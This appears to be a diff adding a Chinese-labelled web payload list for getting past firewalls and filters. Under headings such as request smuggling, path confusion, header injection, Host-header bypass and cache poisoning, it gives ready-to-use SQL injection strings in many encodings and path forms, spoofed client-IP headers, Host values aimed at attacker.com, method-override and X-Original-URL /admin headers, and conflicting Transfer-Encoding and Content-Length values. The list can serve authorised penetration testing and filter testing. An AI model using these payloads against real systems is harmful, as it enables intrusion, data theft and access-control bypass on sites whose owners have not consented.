@@ -1,0 +1,89 @@
+# 奇葩绕过技术 - 通用
+# 请求走私
+GET / HTTP/1.1
+Host: target.com
+Content-Length: 0
+Transfer-Encoding: chunked
+
+# HTTP/2 降级
+:method: GET
+:path: /?id=1' OR 1=1--
+
+# 协议混淆
+GET /?id=1%27%20OR%201=1-- HTTP/1.1
+GET /?id=1%252527%252520OR%2525201=1-- HTTP/1.1
+
+# 路径混淆
+/api/./user?id=1' OR 1=1--
+/api/../api/user?id=1' OR 1=1--
+/api/;/user?id=1' OR 1=1--
+/api/%2e/user?id=1' OR 1=1--
+/api/%2e%2e/api/user?id=1' OR 1=1--
+
+# 大小写路径
+/API/user?id=1' OR 1=1--
+/Api/User?id=1' OR 1=1--
+
+# 扩展名绕过
+/api/user.json?id=1' OR 1=1--
+/api/user.xml?id=1' OR 1=1--
+/api/user;.js?id=1' OR 1=1--
+
+# Content-Type 绕过
+Content-Type: application/json
+Content-Type: application/x-www-form-urlencoded
+Content-Type: multipart/form-data
+Content-Type: text/plain
+Content-Type: text/xml
+
+# 编码绕过
+Content-Type: application/json; charset=utf-7
+Content-Type: application/json; charset=utf-16
+Content-Type: application/json; charset=utf-32
+Content-Type: application/json; charset=ibm037
+
+# 头部注入
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Cluster-Client-IP: 127.0.0.1
+X-Cluster-Client-IP: 127.0.0.1
+Forwarded: for=127.0.0.1
+Forwarded-For: 127.0.0.1
+
+# Host 头绕过
+Host: target.com
+Host: target.com:80
+Host: target.com:443
+Host: target.com.
+Host: TARGET.COM
+Host: target.com%00.attacker.com
+Host: target.com@attacker.com
+Host: attacker.com#target.com
+
+# 方法绕过
+X-HTTP-Method-Override: PUT
+X-HTTP-Method: PUT
+X-Method-Override: PUT
+
+# 缓存投毒
+X-Forwarded-Host: attacker.com
+X-Forwarded-Scheme: http
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+
+# 分块传输
+Transfer-Encoding: chunked
+Transfer-Encoding: identity
+Transfer-Encoding: chunked, identity
+Transfer-Encoding: identity, chunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+# 长度混淆
+Content-Length: 0
+Content-Length: 100
